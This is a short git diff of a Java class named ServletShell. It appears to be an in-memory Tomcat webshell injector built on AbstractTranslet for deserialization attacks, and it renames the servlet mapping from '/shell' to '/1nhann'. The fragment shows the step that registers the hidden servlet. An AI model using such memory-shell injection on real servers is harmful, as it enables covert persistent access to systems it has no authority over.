@@ -30,7 +30,7 @@ public class ServletShell extends AbstractTranslet implements Serializable,javax
             standardCtx.addChild(newWrapper);
 
             // 添加ServletMapping将访问的URL和javax.servlet.Servlet进行绑定
-            standardCtx.addServletMappingDecoded("/shell","1nhann");
+            standardCtx.addServletMappingDecoded("/1nhann","1nhann");
 
         }catch (Exception e){
 
